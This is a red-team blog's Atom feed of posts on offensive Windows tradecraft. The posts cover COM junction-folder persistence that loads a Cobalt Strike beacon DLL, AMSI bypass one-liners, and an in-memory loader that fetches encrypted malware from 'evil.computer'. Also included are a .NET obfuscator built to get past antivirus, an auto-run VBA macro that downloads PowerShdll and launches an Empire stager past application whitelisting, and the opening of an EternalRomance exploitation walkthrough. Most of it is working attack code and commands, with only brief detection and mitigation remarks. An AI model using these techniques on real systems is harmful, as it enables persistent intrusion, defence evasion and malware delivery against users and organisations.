<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://vanmieghem.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vanmieghem.io/" rel="alternate" type="text/html" /><updated>2019-02-23T10:45:15+01:00</updated><id>https://vanmieghem.io/</id><title type="html">Vincent Van Mieghem</title><subtitle>A blog about red teaming and stuff related</subtitle><entry><title type="html">Persisting our implant like the CIA</title><link href="https://vanmieghem.io/persisting-like-a-cia-agent/" rel="alternate" type="text/html" title="Persisting our implant like the CIA" /><published>2019-02-22T00:00:00+01:00</published><updated>2019-02-22T00:00:00+01:00</updated><id>https://vanmieghem.io/persisting-like-a-cia-agent</id><content type="html" xml:base="https://vanmieghem.io/persisting-like-a-cia-agent/">&lt;p&gt;In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to &lt;a href=&quot;https://wikileaks.org/ciav7p1/cms/page_13763373.html&quot;&gt;this&lt;/a&gt; Vault7 page. Last weekend I found some time to get this technique to work.&lt;/p&gt;

&lt;p&gt;I tend to only write about things that I haven’t found published somewhere else, so this blog post only lays out the operational details on getting this technique to work. Please read the Vault7 page first and if you’re interested, more research related to &lt;a href=&quot;https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence&quot;&gt;COM hijacking&lt;/a&gt; and on &lt;a href=&quot;https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/&quot;&gt;Abusing the COM Registry Structure&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Basically this method works by registering a COM CLSID and using that CLSID to point to an (in this case) executable. When Windows encounters this CLSID, it performs a lookup in the registry and executes the corresponding COM object, given the correct properties are set. So called “Junction Folders” are then used to trigger CLSID lookups in Windows.&lt;/p&gt;

&lt;h3 id=&quot;configuring-peristence&quot;&gt;Configuring peristence&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\&amp;gt; [guid]::newguid()

Guid
----
781a4161-4490-408d-814a-93efe3b100c3

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The third command is most interesting because this is where you point the CLSID to your executable on disk, in this case &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\beacon.dll&lt;/code&gt;. For this method to work, there are some requirements to be met by this executable (more about that later).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
New-Item –Path &quot;HKCU:\Software\Classes\CLSID\&quot; -Name &quot;{781a4161-4490-408d-814a-93efe3b100c3}&quot;

New-Item –Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}&quot;  -Name &quot;InprocServer32&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;(Default)&quot; -Value &quot;C:\beacon.dll&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;ThreadingModel&quot; -Value &quot;Apartment&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32&quot; -Name &quot;LoadWithoutCOM&quot; -Value &quot;&quot; -PropertyType &quot;String&quot;

New-Item –Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}&quot;  -Name &quot;ShellFolder&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder&quot; -Name &quot;HideOnDesktop&quot; -Value &quot;&quot; -PropertyType &quot;String&quot;

New-ItemProperty -Path &quot;HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder&quot; -Name &quot;Attributes&quot; -Value 0xf090013d -Type DWord

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you create your junction folder, using this CLSID we just registered. Windows Explorer will help us by hiding the CLSID:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-Item -ItemType Directory -Force -Path &quot;C:\Users\superusr\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Windows Accessories\Indexing.{781a4161-4490-408d-814a-93efe3b100c3}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For persistence, this directory should be a directory that Explorer loads when started on boot. CIA recommends using &lt;code class=&quot;highlighter-rouge&quot;&gt;Windows Accessories&lt;/code&gt;, but I’m sure there are other directories. The &lt;code class=&quot;highlighter-rouge&quot;&gt;Startup&lt;/code&gt; directory could also be used but is obviously more suspicious. Procmon could be of help finding those directories that can be used to persist using Windows Explorer (or others).&lt;/p&gt;

&lt;h3 id=&quot;dll-structure&quot;&gt;DLL structure&lt;/h3&gt;

&lt;p&gt;I’ve spent some time trying to create a C++ DLL that executes shellcode or a process, but all attempts resulted in &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; crashing. 
Eventually, I tried a stageless x64 DLL generated by Cobalt Strike containing 64-bit shellcode on a x64 version of Windows 10, which did the job.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on artifact kit’s source code, a &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc + VirtualProtect + CreateThread&lt;/code&gt; execution with stageless 64-bit shellcode should work, but I still have to figure out the exact constrains set by &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;detection&quot;&gt;Detection&lt;/h3&gt;

&lt;p&gt;Yeah, that’s a bit more difficult. Autoruns does not detect this persistency method. &lt;a href=&quot;https://twitter.com/fuseyjz&quot;&gt;@fuseyjz&lt;/a&gt; from Countercept &lt;a href=&quot;https://countercept.com/blog/hunting-for-junction-folder-persistence/&quot;&gt;created a script&lt;/a&gt; that can be used to hunt for this technique by enumerating folders containing a CLISD in &lt;code class=&quot;highlighter-rouge&quot;&gt;...\Start Menu\&lt;/code&gt; and mapping them against CLSIDs registered in the registry. However, it should be noted that this script only checks &lt;code class=&quot;highlighter-rouge&quot;&gt;HKCU&lt;/code&gt; and that &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; is not the only process that can be leveraged to perform a CLSID lookup…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2019-02-22-persisting-like-the-cia/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Tradecraft" /><category term="Persistence" /><summary type="html">In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to this Vault7 page. Last weekend I found some time to get this technique to work.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /></entry><entry><title type="html">Towards generic .NET assembly obfuscation (Pt. 1)</title><link href="https://vanmieghem.io/towards-generic-.net-obfuscation/" rel="alternate" type="text/html" title="Towards generic .NET assembly obfuscation (Pt. 1)" /><published>2018-09-01T00:00:00+02:00</published><updated>2018-09-01T00:00:00+02:00</updated><id>https://vanmieghem.io/towards-generic-.net-obfuscation</id><content type="html" xml:base="https://vanmieghem.io/towards-generic-.net-obfuscation/">&lt;p&gt;About 2 years ago when I entered the red teaming field, PowerShell was huge. It was an easy, elegant and clean way to evade anti-malware solutions. But largely due to the efforts from Microsoft to implement defence capabilities such as &lt;a href=&quot;https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/&quot;&gt;AMSI and Script Logging into PowerShell (v5)&lt;/a&gt;, those happy PowerShell days for red teamers are over. Sure, it’s still possible:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[PSObject]Assmebly.GetType('System.Management.Automation'+'Utils'),GetType('amsiIni'+'tFailed', 'nonPublic, static').setValue($null, $true)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but it’s getting more difficult.&lt;/p&gt;

&lt;p&gt;So as often, the red team finds other low hanging fruit with which it’s easier to achieve its goal: .NET.&lt;/p&gt;

&lt;p&gt;Efforts in the industry are shifting from PowerShell towards .NET based toolkits, &lt;a href=&quot;https://github.com/GhostPack/&quot;&gt;GhostPack&lt;/a&gt;, &lt;a href=&quot;https://github.com/tevora-threat/SharpView&quot;&gt;SharpView&lt;/a&gt;, &lt;a href=&quot;https://github.com/djhohnstein/SharpWeb&quot;&gt;SharpWeb&lt;/a&gt; and &lt;a href=&quot;https://github.com/stufus/reconerator&quot;&gt;reconerator&lt;/a&gt; are examples of those efforts.&lt;/p&gt;

&lt;p&gt;Just like with PowerShell modules, it’s often possible to execute those .NET assemblies in memory without touching disk:&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&amp;quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$k=&amp;quot;XOR\_KEY&amp;quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&amp;quot;https://evil.computer/malware.exe&amp;quot;)))|%{$_-bxor$k[$i++%$k.length]}
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters=@(&amp;quot;arg1&amp;quot;, &amp;quot;arg2&amp;quot;)
[namespace.Class]::Main($parameters)&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/70ba16263c07d60075b0d6e5cfd51bc5.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;p&gt;or using Cobalt Strike’s 3.11 beacon functionality &lt;code class=&quot;highlighter-rouge&quot;&gt;execute-assembly&lt;/code&gt; [&lt;a href=&quot;https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/&quot;&gt;1&lt;/a&gt;].&lt;/p&gt;

&lt;h3 id=&quot;obfuscating-net-binaries&quot;&gt;Obfuscating .NET binaries&lt;/h3&gt;

&lt;p&gt;But sometimes it’s inevitable to drop a .NET assembly to disk, or you want to adhere to general good OpSec practices and want to obfuscate your binaries, just in case. I’d be nice to have an obfuscator for .NET assemblies that can obfuscate any .NET assembly, while leaving its functionality intact.&lt;/p&gt;

&lt;p&gt;The idea described here is centred around encapsulation of the .NET assembly and loading the encapsulated assembly via the (not logged or monitored) &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt; .NET method at runtime. The output of our obfuscator should be an assembly that loads the original (malicious) assembly into its own process space. Our obfuscator should perform the following steps:&lt;/p&gt;

&lt;h4 id=&quot;1-take-a-net-assembly-as-input-obfuscate--encrypt-the-net-assembly-and-encode-it-to-a-base64-string&quot;&gt;1. Take a .NET assembly as input, obfuscate / encrypt the .NET assembly and encode it to a base64 string:&lt;/h4&gt;

&lt;noscript&gt;&lt;pre&gt;String path = args[0];
key = getRandomKey();
String filename = Path.GetFileNameWithoutExtension(path).ToString();
String obfuscatedBin = obfuscateBinary(path);

private String obfuscateBinary(String file) {
    byte[] assemblyBytes = fileToByteArray(@file);
    byte[] encryptedAssembly = encrypt(assemblyBytes, key);
    return System.Convert.ToBase64String(encryptedAssembly);
}&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/bdeb32458db2c33655cb46470bd7fdd9.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h4 id=&quot;2-create-c-code-that-deobfuscates--decrypts-the-base64-string-and-loads-the-output-via-assemblyloadbyte&quot;&gt;2. Create C# code that deobfuscates / decrypts the base64 string and loads the output via &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt;:&lt;/h4&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;srcTemplate&lt;/code&gt; variable contains a template for the (outer) assembly output of the obfuscator. Into this template, we copy the obfuscated / encrypted malicious assembly. At runtime, this obfuscated assembly will be deobfuscated and loaded via &lt;code class=&quot;highlighter-rouge&quot;&gt;Assembly.Load(byte[])&lt;/code&gt;. The tricky bit here is that after loading the assembly, we don’t know which method in the assembly &lt;code class=&quot;highlighter-rouge&quot;&gt;Main&lt;/code&gt; is. We can solve this by matching on its features: &lt;code class=&quot;highlighter-rouge&quot;&gt;public&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;static&lt;/code&gt; and arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;String[]&lt;/code&gt;. If it fails, we’ll move on to find the next method with these features. When we’ve found the method that matches these features, we’ll invoke it and pass it the arguments obtained from the “outer” assembly.&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;public static string srcTemplate = @&amp;quot;using System;
                using System.Collections.Generic;
                using System.IO;
                using System.Reflection;
                using System.Security.Cryptography;

                namespace Loader {
                    public static class Loader {
                    
                        private static readonly byte[] SALT = new byte[] { 0xba, 0xdc, 0x0f, 0xfe, 0xeb, 0xad, 0xbe, 0xfd, 0xea, 0xdb, 0xab, 0xef, 0xac, 0xe8, 0xac, 0xdc };
                        public static void Main(string[] args) {
                            byte[] bytes = decrypt(Convert.FromBase64String(Package.dotnetfile), Package.key);
                            Assembly a = Assembly.Load(bytes);

                            foreach (Type type in a.GetTypes()) {
                                try {
                                    object instance = Activator.CreateInstance(type);
                                    object[] procargs = new object[] { args };
                                    var methodInfo = type.GetMethod(&amp;quot;&amp;quot;Main&amp;quot;&amp;quot;, BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static | BindingFlags.FlattenHierarchy);
                                    var result = methodInfo.Invoke(instance, procargs);
                                }
                                catch (Exception e) { }
                            }
                        }

                        public static byte[] decrypt(byte[] cipher, string key) { // Left out }
                        
                        public class Package {
                            public static string dotnetfile = @&amp;quot;&amp;quot;INSERTHERE&amp;quot;&amp;quot;;
                            public static string key = @&amp;quot;&amp;quot;KEY&amp;quot;&amp;quot;;
                        }
                }&amp;quot;;
                
String obfuscatedBin = obfuscateBinary(path);
String tmpStr = srcTemplate.Replace(&amp;quot;INSERTHERE&amp;quot;, obfuscatedBin);
String srcFinal = tmpStr.Replace(&amp;quot;KEY&amp;quot;, key);&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/54bca3ce83ef14d9bdae549691e24e91.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h4 id=&quot;3-compile-a-new-net-assembly-at-runtime&quot;&gt;3. Compile a new .NET assembly at runtime:&lt;/h4&gt;

&lt;p&gt;When the template is filled in, we compile the output assembly:&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;compile(srcFinal, filename + &amp;quot;_obfuscated.exe&amp;quot;);

static void compile(String source, String outfile) {
    var provider_options = new Dictionary&amp;lt;string, string&amp;gt;
    {
        {&amp;quot;CompilerVersion&amp;quot;,&amp;quot;v3.5&amp;quot;}
    };
    var provider = new Microsoft.CSharp.CSharpCodeProvider(provider_options);
    
    var compiler_params = new System.CodeDom.Compiler.CompilerParameters();
    compiler_params.OutputAssembly = outfile;
    compiler_params.GenerateExecutable = true;

    // Compile
    var results = provider.CompileAssemblyFromSource(compiler_params, source);
    Console.WriteLine(&amp;quot;Output file: {0}&amp;quot;, outfile);
    Console.WriteLine(&amp;quot;Number of Errors: {0}&amp;quot;, results.Errors.Count);
    foreach (System.CodeDom.Compiler.CompilerError err in results.Errors) {
        Console.WriteLine(&amp;quot;ERROR {0}&amp;quot;, err.ErrorText);
    }
}&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/8b5e117a65ea15f23c2b40a8b15889be.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;p&gt;When implementing this yourself, I encourage you to implement your own obfuscation / encryption routines, as well as some sandbox evasion techniques. While this technique bypasses all traditional AV products, leaving the base64 string as is in the “outer” .NET assembly will trigger some “ML engines”, since the assembly looks at lot like a loader: limited code and a large blob of &lt;code class=&quot;highlighter-rouge&quot;&gt;String&lt;/code&gt;. In a following part, I will describe some evasion methods for these “ML engines”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2018-08-31-towards-generic-net-obfuscation/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;SafetyKatz obfuscation.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2018-08-31-towards-generic-net-obfuscation/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Piping of arguments to the encapsulated Seatbelt binary.&lt;/figcaption&gt;</content><author><name>vivami</name></author><category term="blog" /><category term=".NET" /><category term="Obfuscation" /><summary type="html">About 2 years ago when I entered the red teaming field, PowerShell was huge. It was an easy, elegant and clean way to evade anti-malware solutions. But largely due to the efforts from Microsoft to implement defence capabilities such as AMSI and Script Logging into PowerShell (v5), those happy PowerShell days for red teamers are over. Sure, it’s still possible:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /></entry><entry><title type="html">Phishing between the App Whitelists</title><link href="https://vanmieghem.io/phishing-between-the-app-whitelists/" rel="alternate" type="text/html" title="Phishing between the App Whitelists" /><published>2017-06-09T00:00:00+02:00</published><updated>2017-06-09T00:00:00+02:00</updated><id>https://vanmieghem.io/phishing-between-the-app-whitelists</id><content type="html" xml:base="https://vanmieghem.io/phishing-between-the-app-whitelists/">&lt;p&gt;An increasing number of organisations is moving towards virtual desktop environments. They are often easier to administer and maintain, and provide possibilities for additional security layers. One of those security layers more and more encountered at organisations is the RES One Workspace whitelisting solution. While &lt;a href=&quot;https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/&quot;&gt;quite&lt;/a&gt; &lt;a href=&quot;https://msitpros.com/?p=3831&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/&quot;&gt;lot&lt;/a&gt; was written lately on bypassing AWL (Application Whitelisting), these techniques are aimed towards bypassing Microsofts AppLocker/Device Guard in Windows 10. A reasonably secure configuration of RES One Workspace blocks execution of all of these Microsoft signed binaries (&lt;code&gt;InstallUtil.exe&lt;/code&gt;, &lt;code&gt;regsvcs.exe&lt;/code&gt;, &lt;code&gt;regasm.exe&lt;/code&gt;, &lt;code&gt;regsvr32.exe&lt;/code&gt;) used to run code within their context.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;[Using regasm.exe](https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/) to execute &lt;code&gt;dlls&lt;/code&gt; blocked by RES One.&lt;/figcaption&gt;

&lt;p&gt;RES One also becomes annoying while &lt;a href=&quot;https://enigma0x3.net/2016/03/15/phishing-with-empire/&quot;&gt;phishing with Empire&lt;/a&gt;, as the execution of the Empire stagers is prevented by RES One, blocking the execution of &lt;code&gt;powershell.exe&lt;/code&gt; entirely for that victim user.&lt;/p&gt;

&lt;p&gt;However, either by mistake or for the sake of keeping intact certain Windows functionality, &lt;code&gt;rundll.exe&lt;/code&gt; is typically whitelisted by administrators. Depending on the type of pentest, &lt;code&gt;rundll&lt;/code&gt; can be used to spawn a Command Prompt, using the &lt;a href=&quot;https://reactos.org&quot;&gt;ReactOS&lt;/a&gt; &lt;code&gt;&lt;a href=&quot;http://www.didierstevens.com/files/software/cmd-dll_v0_0_1.zip&quot;&gt;cmd.dll&lt;/a&gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Shortcut creation to use cmd.dll via rundll32.exe&lt;/figcaption&gt;

&lt;p&gt;Creating the following shortcut to &lt;code&gt;cmd.dll&lt;/code&gt; via &lt;code&gt;rundll32.exe&lt;/code&gt; yields a pretty functional “Command Prompt”. From there it is oftentimes possible to return to your usual PowerShell environment. Recently, &lt;a href=&quot;https://twitter.com/xP3nt4&quot;&gt;@xP3nt4&lt;/a&gt; created the &lt;a href=&quot;https://github.com/p3nt4/PowerShdll&quot;&gt;PowerSdll&lt;/a&gt; project which is a more functional alternative to &lt;code&gt;cmd.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-06-09-phishing-between-the-app-whitelists/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;cmd.dll command prompt running under the rundll32.exe context&lt;/figcaption&gt;

&lt;p&gt;The PowerSdll project also provides a bypass for our phishing issue. We can now create a macro that downloads the &lt;code&gt;PowerShdll.dll&lt;/code&gt; for the right architecture, and uses the downloaded &lt;code&gt;dll&lt;/code&gt; to execute a PowerShell script (in this case an Empire stager) via &lt;code&gt;rundll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The VBA script below is a PoC I wrote that spawns an Empire agent in a RES One environment. It downloads the proper &lt;code&gt;PowerShdll.dll&lt;/code&gt; corresponding to the system’s architecture to the user’s &lt;code&gt;Temp&lt;/code&gt; directory and executes the script at &lt;code&gt;https://127.0.0.1/Empire_default_launcher.ps1&lt;/code&gt; (in this case the output of &lt;code&gt;launcher ListenerName&lt;/code&gt;.&lt;/p&gt;

&lt;noscript&gt;&lt;pre&gt;Sub AutoOpen()
    Debugging
End Sub

Sub Document_Open()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim Str As String
    Str = &amp;quot;C:\Windows\System32\rundll32.exe &amp;quot; &amp;amp; Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll,main . { iwr -useb https://127.0.0.1/Empire_default_launcher.ps1 } ^| iex;&amp;quot;
    strComputer = &amp;quot;.&amp;quot;
    Set objWMIService = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2&amp;quot;)
    Set objStartup = objWMIService.Get(&amp;quot;Win32_ProcessStartup&amp;quot;)
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2:Win32_Process&amp;quot;)
    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll&amp;quot;
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll&amp;quot;
    #Else
        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll&amp;quot;
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject(&amp;quot;MSXML2.ServerXMLHTTP.6.0&amp;quot;)
    WinHttpReq.Open &amp;quot;GET&amp;quot;, dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject(&amp;quot;ADODB.Stream&amp;quot;)
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub&lt;/pre&gt;&lt;/noscript&gt;
&lt;script src=&quot;https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;

&lt;h3 id=&quot;running-an-awl-solution&quot;&gt;Running an AWL solution?&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Try to blacklist &lt;code&gt;rundll32.exe&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Make sure to also include &lt;code&gt;dll's&lt;/code&gt; in your AWL. An AWL only checking for executables is not really a (AWL) &lt;strong&gt;solution&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Empire" /><category term="App whitelisting bypass" /><summary type="html">An increasing number of organisations is moving towards virtual desktop environments. They are often easier to administer and maintain, and provide possibilities for additional security layers. One of those security layers more and more encountered at organisations is the RES One Workspace whitelisting solution. While quite a lot was written lately on bypassing AWL (Application Whitelisting), these techniques are aimed towards bypassing Microsofts AppLocker/Device Guard in Windows 10. A reasonably secure configuration of RES One Workspace blocks execution of all of these Microsoft signed binaries (InstallUtil.exe, regsvcs.exe, regasm.exe, regsvr32.exe) used to run code within their context.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /></entry><entry><title type="html">Eternalromance: eternal pwnage of Windows Server 2003 and XP</title><link href="https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/" rel="alternate" type="text/html" title="Eternalromance: eternal pwnage of Windows Server 2003 and XP" /><published>2017-04-26T00:00:00+02:00</published><updated>2017-04-26T00:00:00+02:00</updated><id>https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp</id><content type="html" xml:base="https://vanmieghem.io/eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/">&lt;p&gt;Most of the write-ups on the &lt;a href=&quot;https://github.com/misterch0c/shadowbroker&quot;&gt;leaked Equation Group tools&lt;/a&gt; by the shadow brokers are &lt;a href=&quot;https://www.exploit-db.com/docs/41896.pdf&quot;&gt;about the Eternalblue exploit&lt;/a&gt;, an RCE SMB exploit that provides SYSTEM to the attacker of Windows 7 and Windows Server 2008 machines not patched with &lt;a href=&quot;https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010&quot;&gt;MS17–010&lt;/a&gt;. Cool stuff, however, maybe even cooler is the stuff that will provide reverse shells for life: Eternalromance on fully patched Windows XP and Server 2003 machines. In this short write-up, I’ll explain how to get EternalRomance working by popping a meterpreter session on a fully patched Windows Server 2003 R2 SP2 box.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/1.png&quot; alt=&quot;win2003&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Fully patched Windows Server 2003.&lt;/figcaption&gt;

&lt;p&gt;Eternalromance requires shellcode for the exploitation phase. Any shellcode other than shellcode generated by the Doublepulsar implant, results in a BSOD on the box (trust me, I’ve tried this many times…).&lt;/p&gt;

&lt;p&gt;Start FuzzBunch and type &lt;code&gt;use Doublepulsar&lt;/code&gt;. Walk through the default options and choose function &lt;code&gt;OutputInstall&lt;/code&gt;. This generates the shellcode to feed to Eternalromance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
